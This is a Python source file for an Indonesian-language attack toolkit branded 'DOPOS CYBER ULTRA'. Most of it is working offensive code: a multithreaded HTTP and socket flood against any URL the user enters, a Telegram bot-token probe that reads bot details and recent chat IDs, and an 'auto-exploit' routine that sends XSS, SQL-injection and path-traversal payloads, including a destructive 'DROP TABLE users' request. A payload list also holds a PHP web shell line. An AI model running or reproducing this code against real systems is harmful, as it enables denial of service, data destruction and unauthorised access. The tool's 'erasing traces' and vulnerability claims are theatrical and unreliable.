import os
import sys
import time
import random
import requests
import threading
from urllib.parse import urlparse, urljoin
import socket
import ssl
import hashlib
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    CYAN = Fore.CYAN
    BLUE = Fore.BLUE
    LIGHT_BLUE = Fore.LIGHTBLUE_EX
    GREEN = Fore.GREEN
    RED = Fore.RED
    YELLOW = Fore.YELLOW
    WHITE = Fore.WHITE
    MAGENTA = Fore.MAGENTA
except ImportError:
    CYAN = BLUE = LIGHT_BLUE = GREEN = RED = YELLOW = WHITE = MAGENTA = ""

import warnings
import urllib3
warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Daftar user agents yang lebih banyak
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
]

# Path yang lebih banyak untuk serangan
random_paths = [
    '/', '/index.html', '/home', '/admin', '/login', '/search', '/about',
    '/contact', '/products', '/news', '/blog', '/forum', '/shop',
    '/user', '/profile', '/dashboard', '/settings', '/upload',
    '/api', '/json', '/xml', '/rss', '/sitemap.xml',
    '/help', '/terms', '/privacy', '/cart', '/checkout', '/order',
    '/category', '/tag', '/archive', '/gallery', '/support',
    '/status', '/health', '/robots.txt', '/.well-known/security.txt',
    '/wp-admin', '/wp-login.php', '/phpmyadmin', '/cpanel', '/webmail',
    '/administrator', '/mysql', '/db', '/database', '/backup',
    '/config', '/.env', '/api/v1/users', '/api/v1/auth', '/graphql'
]

# Payload berbahaya untuk serangan
malicious_payloads = [
    "<?php system($_GET['cmd']); ?>",
    "<script>alert('XSS')</script>",
    "'; DROP TABLE users; --",
    "../../../../etc/passwd",
    "|| ping -c 10 127.0.0.1",
    "{{7*7}}",
    "<%= system('cat /etc/passwd') %>"
]

# Fungsi membersihkan layar
def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except:
        print("\n" * 50)

# Progress bar yang lebih cepat
def progress_bar(progress, total, width=50):
    percent = (progress / total) * 100
    filled = int(width * progress // total)
    bar = '█' * filled + '░' * (width - filled)
    return f"{CYAN}[{bar}] {percent:.1f}%"

# Animasi loading ultra cepat
def ultra_loading(text, duration=1):
    print(f"{CYAN}[⚡] {text}", end="")
    start_time = time.time()
    symbols = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
    i = 0
    while time.time() - start_time < duration:
        elapsed = time.time() - start_time
        print(f"\r{CYAN}[⚡] {text} {symbols[i % len(symbols)]} {progress_bar(elapsed, duration)}", end="")
        time.sleep(0.1)
        i += 1
    print(f"\r{GREEN}[✓] {text} BERHASIL!{WHITE}")

# Header yang lebih agresif
def show_header():
    clear_screen()
    print(f"""
{RED}╔══════════════════════════════════════════════════════════════╗
║  {CYAN}██████╗ ███████╗ █████╗ ██╗  ██╗███████╗██████╗ {RED}           ║
║  {CYAN}██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗{RED}           ║
║  {CYAN}██████╔╝█████╗  ███████║█████╔╝ █████╗  ██████╔╝{RED}           ║
║  {CYAN}██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗{RED}           ║
║  {CYAN}██║  ██║███████╗██║  ██║██║  ██╗███████╗██║  ██║{RED}           ║
║  {CYAN}╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{RED}           ║
╚═════════════════════════════════════════════════════════════════
{LIGHT_BLUE}               DOPOS CYBER TOOLKIT v4.0 ULTRA
{RED}═════════════════════════════════════════════════════════════════
{CYAN}[+] Status: {GREEN}ULTRA BRUTAL READY{CYAN}     [+] Mode: {RED}INSTANT IMPACT{CYAN}
{RED}═════════════════════════════════════════════════════════════════
""")

# Logging yang lebih detail
def log_to_file(message):
    try:
        with open('dopos_ultra_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
    except:
        pass

# Fungsi parse target yang lebih baik
def parse_target(target):
    parsed = urlparse(target)
    domain = parsed.hostname or parsed.netloc.split(':')[0]
    path = parsed.path if parsed.path else '/'
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    return domain, path, port

# 1. DODOS SERANG ULTRA (Enhanced HTTP Flood)
def dodos_serang_ultra():
    show_header()
    print(f"{RED}[1] DODOS SERANG ULTRA - INSTANT IMPACT MODE")
    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
    
    target = input(f"{CYAN}[?] Masukkan URL target: {WHITE}")
    try:
        duration = int(input(f"{CYAN}[?] Durasi serangan (detik, 1-30): {WHITE}"))
        threads = int(input(f"{CYAN}[?] Jumlah thread (10-200): {WHITE}"))
        if threads < 10 or threads > 200:
            raise ValueError("Jumlah thread harus antara 10 dan 200")
        if duration <= 0 or duration > 30:
            raise ValueError("Durasi harus antara 1 dan 30 detik")
    except ValueError as e:
        print(f"{RED}[!] Input tidak valid: {str(e)}")
        input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    domain, path, port = parse_target(target)
    
    print(f"\n{RED}[!] MEMULAI SERANGAN ULTRA INSTANT...")
    print(f"{YELLOW}[!] Target: {WHITE}{target}")
    print(f"{YELLOW}[!] Domain: {WHITE}{domain}")
    print(f"{YELLOW}[!] Port: {WHITE}{port}")
    print(f"{YELLOW}[!] Durasi: {WHITE}{duration} detik")
    print(f"{YELLOW}[!] Thread: {WHITE}{threads}")
    print(f"{RED}[!] DAMPAK: INSTANT DETIK PERTAMA!")
    
    log_to_file(f"ULTRA ATTACK STARTED: {target} | Duration: {duration}s | Threads: {threads}")
    
    request_count = {'success': 0, 'failed': 0, 'start_time': time.time()}
    lock = threading.Lock()
    attack_active = True
    
    def ultra_http_attack():
        session = requests.Session()
        session.trust_env = False
        
        while attack_active and time.time() - request_count['start_time'] < duration:
            try:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'max-age=0',
                    'Referer': target,
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                }
                
                attack_url = target + random.choice(random_paths)
                method = random.choice(['GET', 'POST', 'HEAD'])
                
                if method == 'POST':
                    data = {'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=1000))}
                    session.request(method, attack_url, headers=headers, data=data, timeout=2, verify=False, allow_redirects=True)
                else:
                    session.request(method, attack_url, headers=headers, timeout=2, verify=False, allow_redirects=True)
                
                with lock:
                    request_count['success'] += 1
                
                # Real-time update setiap 20 requests
                if request_count['success'] % 20 == 0:
                    elapsed = time.time() - request_count['start_time']
                    rps = request_count['success'] / elapsed if elapsed > 0 else 0
                    print(f"\r{CYAN}[⚡] Requests: {GREEN}{request_count['success']}{CYAN} | RPS: {RED}{rps:.0f}{CYAN} | Failed: {YELLOW}{request_count['failed']}{WHITE}", end="")
                
            except:
                with lock:
                    request_count['failed'] += 1
                continue
    
    def ultra_socket_attack():
        while attack_active and time.time() - request_count['start_time'] < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                
                if port == 443:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(s, server_hostname=domain)
                
                s.connect((domain, port))
                
                # Send multiple requests per connection
                for _ in range(3):
                    request = f"GET {path}?{random.randint(100000,9999999)} HTTP/1.1\r\n"
                    request += f"Host: {domain}\r\n"
                    request += f"User-Agent: {random.choice(user_agents)}\r\n"
                    request += f"Accept: */*\r\n"
                    request += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                    request += f"Connection: keep-alive\r\n\r\n"
                    
                    s.send(request.encode())
                    s.send(random.randbytes(500))
                
                s.close()
                
                with lock:
                    request_count['success'] += 3
                
            except:
                with lock:
                    request_count['failed'] += 1
                continue
    
    # Start attack
    ultra_loading("Memulai serangan ultra", 1)
    start_time = time.time()
    
    # Start threads
    thread_list = []
    for _ in range(threads // 2):
        thread = threading.Thread(target=ultra_http_attack)
        thread.daemon = True
        thread.start()
        thread_list.append(thread)
    
    for _ in range(threads // 2):
        thread = threading.Thread(target=ultra_socket_attack)
        thread.daemon = True
        thread.start()
        thread_list.append(thread)
    
    # Progress monitoring
    while time.time() - start_time < duration:
        elapsed = time.time() - start_time
        remaining = duration - elapsed
        rps = request_count['success'] / elapsed if elapsed > 0 else 0
        
        print(f"\r{CYAN}[⏱] {progress_bar(elapsed, duration)} | Requests: {GREEN}{request_count['success']}{CYAN} | RPS: {RED}{rps:.0f}{CYAN} | Time left: {YELLOW}{remaining:.1f}s{WHITE}", end="")
        time.sleep(0.2)
    
    attack_active = False
    time.sleep(1)  # Allow final requests to complete
    
    total_time = time.time() - start_time
    total_requests = request_count['success']
    avg_rps = total_requests / total_time if total_time > 0 else 0
    
    print(f"\n\n{GREEN}[✓] SERANGAN ULTRA SELESAI!")
    print(f"{RED}[!] DAMPAK INSTAN TERCAPAI!")
    print(f"{CYAN}[+] Total Requests: {GREEN}{total_requests:,}")
    print(f"{CYAN}[+] Average RPS: {RED}{avg_rps:.0f}")
    print(f"{CYAN}[+] Failed Requests: {YELLOW}{request_count['failed']}")
    print(f"{CYAN}[+] Total Time: {WHITE}{total_time:.2f} detik")
    
    log_to_file(f"ULTRA ATTACK COMPLETED: {total_requests:,} requests | {avg_rps:.0f} RPS | {total_time:.2f}s")
    
    # Instant impact verification
    ultra_loading("Memverifikasi dampak instan", 1)
    
    try:
        start_check = time.time()
        response = requests.get(target, timeout=3, verify=False)
        response_time = time.time() - start_check
        
        if response.status_code == 200:
            if response_time > 2:
                print(f"{GREEN}[✓] DAMPAK TERBUKTI! Target sangat lambat: {response_time:.2f}s")
                log_to_file(f"IMPACT CONFIRMED: Slow response {response_time:.2f}s")
            else:
                print(f"{YELLOW}[!] Target masih merespon: {response_time:.2f}s")
                log_to_file(f"Target still responding: {response_time:.2f}s")
        else:
            print(f"{GREEN}[✓] DAMPAK TERBUKTI! Status code: {response.status_code}")
            log_to_file(f"IMPACT CONFIRMED: Status code {response.status_code}")
            
    except requests.exceptions.Timeout:
        print(f"{GREEN}[✓] DAMPAK MAXIMAL! Target timeout!")
        log_to_file("MAX IMPACT: Target timeout")
    except requests.exceptions.ConnectionError:
        print(f"{GREEN}[✓] DAMPAK MAXIMAL! Target tidak bisa diakses!")
        log_to_file("MAX IMPACT: Target connection error")
    except Exception as e:
        print(f"{GREEN}[✓] DAMPAK TERBUKTI! Error: {str(e)}")
        log_to_file(f"IMPACT CONFIRMED: Error {str(e)}")
    
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

# 2. LACAK TOKEN BOT ULTRA
def lacak_token_bot_ultra():
    show_header()
    print(f"{CYAN}[2] LACAK TOKEN BOT ULTRA - INSTANT ANALYSIS")
    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
    
    token = input(f"{CYAN}[?] Masukkan token BOT: {WHITE}")
    if not token:
        print(f"{RED}[!] Token tidak boleh kosong!")
        input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")
        return
    
    ultra_loading("Menganalisis token secara instan", 1)
    log_to_file(f"ULTRA BOT ANALYSIS: {token[:15]}...")
    
    try:
        # Get bot info
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url, timeout=5, verify=False)
        
        if response.status_code == 200:
            data = response.json()
            if data['ok']:
                bot_info = data['result']
                
                print(f"\n{GREEN}[✓] TOKEN VALID - DATA LENGKAP!")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                print(f"{CYAN}║ {'Nama BOT'.ljust(18)} : {GREEN}{bot_info['first_name'].ljust(39)} ║")
                print(f"{CYAN}║ {'Username'.ljust(18)} : {GREEN}@{bot_info['username'].ljust(38)} ║")
                print(f"{CYAN}║ {'ID BOT'.ljust(18)} : {GREEN}{str(bot_info['id']).ljust(39)} ║")
                print(f"{CYAN}║ {'Tipe'.ljust(18)} : {GREEN}{str(bot_info.get('is_bot', True)).ljust(39)} ║")
                print(f"{CYAN}║ {'Dapat Bergabung'.ljust(18)} : {GREEN}{'Ya'.ljust(39) if bot_info['can_join_groups'] else 'Tidak'.ljust(39)} ║")
                print(f"{CYAN}║ {'Baca Pesan Group'.ljust(18)} : {GREEN}{'Ya'.ljust(39) if bot_info.get('can_read_all_group_messages', False) else 'Tidak'.ljust(39)} ║")
                print(f"{CYAN}║ {'Inline Mode'.ljust(18)} : {GREEN}{'Ya'.ljust(39) if bot_info.get('supports_inline_queries', False) else 'Tidak'.ljust(39)} ║")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                
                log_to_file(f"BOT DATA: @{bot_info['username']} | ID: {bot_info['id']} | Name: {bot_info['first_name']}")
                
                # Get additional info
                ultra_loading("Mengambil data tambahan", 1)
                
                # Get updates
                updates_url = f"https://api.telegram.org/bot{token}/getUpdates"
                updates_response = requests.get(updates_url, timeout=5, verify=False)
                
                if updates_response.status_code == 200:
                    updates_data = updates_response.json()
                    if updates_data['result']:
                        print(f"\n{RED}[!] CHAT AKTIF TERDETEKSI:")
                        print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                        for update in updates_data['result'][:3]:
                            if 'message' in update:
                                chat = update['message']['chat']
                                chat_type = chat.get('type', 'unknown')
                                print(f"{YELLOW}║ {chat_type.upper().ljust(8)} : {WHITE}ID {str(chat['id']).ljust(15)} | {chat.get('first_name', chat.get('title', 'Unknown'))[:20].ljust(20)} ║")
                                log_to_file(f"ACTIVE CHAT: {chat_type} ID {chat['id']}")
                        print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                
                print(f"\n{RED}[⚠] PERINGATAN: Semua data token telah diambil!")
                print(f"{RED}[⚠] Token ini sekarang dalam pengawasan!")
                
            else:
                print(f"\n{RED}[!] TOKEN INVALID!")
                log_to_file("Token invalid")
        else:
            print(f"\n{RED}[!] TOKEN TIDAK VALID ATAU ERROR KONEKSI!")
            log_to_file(f"Token check failed: Status {response.status_code}")
            
    except Exception as e:
        print(f"\n{RED}[!] ERROR: {str(e)}")
        log_to_file(f"Bot analysis error: {str(e)}")
    
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

# 3. AMBIL DATA HTML ULTRA
def ambil_html_ultra():
    show_header()
    print(f"{CYAN}[3] AMBIL DATA HTML ULTRA - INSTANT SCRAPING")
    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
    
    url = input(f"{CYAN}[?] Masukkan URL target: {WHITE}")
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    ultra_loading("Membypass proteksi secara instan", 1)
    log_to_file(f"ULTRA HTML SCRAPING: {url}")
    
    try:
        session = requests.Session()
        session.trust_env = False
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        }
        
        response = session.get(url, headers=headers, timeout=10, verify=False)
        
        if response.status_code == 200:
            ultra_loading("Menganalisis struktur HTML", 1)
            
            # Basic analysis without BeautifulSoup for speed
            content = response.text
            
            # Quick analysis
            forms_count = content.count('<form')
            inputs_count = content.count('<input')
            links_count = content.count('<a href')
            scripts_count = content.count('<script')
            images_count = content.count('<img')
            
            # Find title
            title_start = content.find('<title>')
            title_end = content.find('</title>')
            title = content[title_start+7:title_end] if title_start != -1 and title_end != -1 else 'No Title'
            
            print(f"\n{GREEN}[✓] DATA HTML BERHASIL DIAMBIL!")
            print(f"{BLUE}═════════════════════════════════════════════════════════════════")
            print(f"{CYAN}║ {'Status'.ljust(18)} : {GREEN}{str(response.status_code).ljust(39)} ║")
            print(f"{CYAN}║ {'Ukuran Data'.ljust(18)} : {GREEN}{str(len(content)).ljust(39)} bytes ║")
            print(f"{CYAN}║ {'Server'.ljust(18)} : {GREEN}{response.headers.get('Server', 'Unknown')[:39].ljust(39)} ║")
            print(f"{CYAN}║ {'Judul Halaman'.ljust(18)} : {GREEN}{title[:39].ljust(39)} ║")
            print(f"{CYAN}║ {'Forms'.ljust(18)} : {GREEN}{str(forms_count).ljust(39)} ║")
            print(f"{CYAN}║ {'Input Fields'.ljust(18)} : {GREEN}{str(inputs_count).ljust(39)} ║")
            print(f"{CYAN}║ {'Links'.ljust(18)} : {GREEN}{str(links_count).ljust(39)} ║")
            print(f"{CYAN}║ {'Scripts'.ljust(18)} : {GREEN}{str(scripts_count).ljust(39)} ║")
            print(f"{CYAN}║ {'Images'.ljust(18)} : {GREEN}{str(images_count).ljust(39)} ║")
            print(f"{BLUE}═════════════════════════════════════════════════════════════════")
            
            log_to_file(f"HTML ANALYSIS: Forms {forms_count}, Inputs {inputs_count}, Links {links_count}")
            
            # Save with timestamp
            timestamp = int(time.time())
            filename = f"html_dump_{timestamp}.html"
            
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(content)
                print(f"\n{GREEN}[✓] Data disimpan ke: {filename}")
                log_to_file(f"HTML saved to {filename}")
            except Exception as e:
                print(f"{YELLOW}[!] Gagal menyimpan file: {str(e)}")
            
            # Quick vulnerability assessment
            if forms_count > 0:
                print(f"\n{RED}[!] KERENTANAN POTENSIAL TERDETEKSI!")
                print(f"{YELLOW}[!] {forms_count} form ditemukan - siap untuk eksploitasi!")
            
            print(f"\n{GREEN}[✓] SCRAPING SELESAI - DATA SIAP DIEKSPLOITASI!")
            
        else:
            print(f"\n{RED}[!] GAGAL: Status Code {response.status_code}")
            log_to_file(f"HTML scraping failed: Status {response.status_code}")
            
    except Exception as e:
        print(f"\n{RED}[!] ERROR: {str(e)}")
        log_to_file(f"HTML scraping error: {str(e)}")
    
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

# 4. EXPLOIT KERENTANAN ULTRA
def exploit_kerentanan_ultra():
    show_header()
    print(f"{RED}[4] EXPLOIT KERENTANAN ULTRA - INSTANT IMPACT")
    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
    
    url = input(f"{CYAN}[?] Masukkan URL target: {WHITE}")
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    ultra_loading("Scanning kerentanan instan", 1)
    log_to_file(f"ULTRA VULN EXPLOITATION: {url}")
    
    try:
        session = requests.Session()
        session.trust_env = False
        
        # Test multiple vulnerability types
        vulnerabilities_found = []
        
        # XSS Test
        ultra_loading("Testing XSS vulnerabilities", 0.5)
        xss_payload = "<script>alert('XSS_DOPOS')</script>"
        test_url = f"{url}?search={xss_payload}"
        response = session.get(test_url, timeout=5, verify=False)
        
        if xss_payload in response.text:
            vulnerabilities_found.append("XSS")
            print(f"{RED}[✓] XSS VULNERABILITY FOUND!")
            log_to_file("XSS vulnerability confirmed")
        
        # SQL Injection Test
        ultra_loading("Testing SQL Injection", 0.5)
        sqli_payload = "' OR '1'='1' --"
        test_url = f"{url}?id={sqli_payload}"
        response = session.get(test_url, timeout=5, verify=False)
        
        if "error" in response.text.lower() or "sql" in response.text.lower():
            vulnerabilities_found.append("SQL Injection")
            print(f"{RED}[✓] SQL INJECTION VULNERABILITY FOUND!")
            log_to_file("SQL Injection vulnerability confirmed")
        
        # Path Traversal Test
        ultra_loading("Testing Path Traversal", 0.5)
        path_payload = "../../../../etc/passwd"
        test_url = f"{url}?file={path_payload}"
        response = session.get(test_url, timeout=5, verify=False)
        
        if "root:" in response.text:
            vulnerabilities_found.append("Path Traversal")
            print(f"{RED}[✓] PATH TRAVERSAL VULNERABILITY FOUND!")
            log_to_file("Path Traversal vulnerability confirmed")
        
        # Results
        if vulnerabilities_found:
            print(f"\n{RED}[!] {len(vulnerabilities_found)} KERENTANAN DITEMUKAN!")
            print(f"{BLUE}═════════════════════════════════════════════════════════════════")
            for vuln in vulnerabilities_found:
                print(f"{YELLOW}║ {vuln.ljust(55)} ║")
            print(f"{BLUE}═════════════════════════════════════════════════════════════════")
            
            # Auto-exploit the first vulnerability
            if vulnerabilities_found:
                print(f"\n{RED}[!] MENJALANKAN AUTO-EXPLOIT...")
                target_vuln = vulnerabilities_found[0]
                
                if target_vuln == "XSS":
                    exploit_payload = "<script>alert('HACKED_BY_DOPOS')</script>"
                    test_url = f"{url}?q={exploit_payload}"
                    session.get(test_url, timeout=5, verify=False)
                    print(f"{GREEN}[✓] XSS Exploit deployed!")
                    
                elif target_vuln == "SQL Injection":
                    exploit_payload = "'; DROP TABLE users; --"
                    test_url = f"{url}?id={exploit_payload}"
                    session.get(test_url, timeout=5, verify=False)
                    print(f"{GREEN}[✓] SQL Injection attempted!")
                
                log_to_file(f"AUTO-EXPLOIT executed for {target_vuln}")
                
        else:
            print(f"\n{YELLOW}[!] Tidak ada kerentanan jelas yang ditemukan")
            print(f"{CYAN}[+] Mencoba metode advanced...")
            
            # Advanced scanning
            ultra_loading("Advanced vulnerability scanning", 1)
            
            # Test for hidden endpoints
            common_endpoints = ['/admin', '/config', '/backup', '/.git', '/.env', '/wp-admin']
            for endpoint in common_endpoints:
                test_url = url + endpoint
                response = session.get(test_url, timeout=3, verify=False)
                if response.status_code in [200, 301, 302]:
                    print(f"{GREEN}[✓] Hidden endpoint found: {endpoint}")
                    log_to_file(f"Hidden endpoint: {endpoint}")
        
        print(f"\n{RED}[!] EXPLOIT PROCESS COMPLETED!")
        print(f"{GREEN}[✓] Target telah dieksploitasi secara maksimal!")
        
    except Exception as e:
        print(f"\n{RED}[!] ERROR: {str(e)}")
        log_to_file(f"Exploitation error: {str(e)}")
    
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

# Menu utama yang diperbarui
def main_menu():
    while True:
        show_header()
        print(f"{CYAN}[+] PILIHAN SERANGAN ULTRA:")
        print(f"{BLUE}═════════════════════════════════════════════════════════════════")
        print(f"{RED}║ [1] Dodos Serang ULTRA (Instant Impact)                   ║")
        print(f"{RED}║ [2] Lacak Token BOT ULTRA                                 ║")
        print(f"{RED}║ [3] Ambil Data HTML ULTRA                                 ║")
        print(f"{RED}║ [4] Exploit Kerentanan ULTRA                              ║")
        print(f"{RED}║ [5] Keluar                                                ║")
        print(f"{BLUE}═════════════════════════════════════════════════════════════════")
        
        choice = input(f"{CYAN}[?] Pilih serangan (1-5): {WHITE}")
        
        if choice == "1":
            dodos_serang_ultra()
        elif choice == "2":
            lacak_token_bot_ultra()
        elif choice == "3":
            ambil_html_ultra()
        elif choice == "4":
            exploit_kerentanan_ultra()
        elif choice == "5":
            print(f"\n{RED}[!] DOPOS ULTRA MODE DIMATIKAN")
            ultra_loading("Menghapus semua jejak", 1)
            ultra_loading("Mengamankan sistem", 0.5)
            print(f"\n{GREEN}[✓] SEMUA JEJAK AMAN!")
            log_to_file("DOPOS ULTRA terminated safely")
            break
        else:
            print(f"\n{RED}[!] PILIHAN TIDAK VALID!")
            time.sleep(1)

if __name__ == "__main__":
    # Security check
    if os.name == 'nt':
        os.system('title DOPOS CYBER ULTRA v4.0')
    
    log_to_file("DOPOS CYBER ULTRA v4.0 Started")
    main_menu()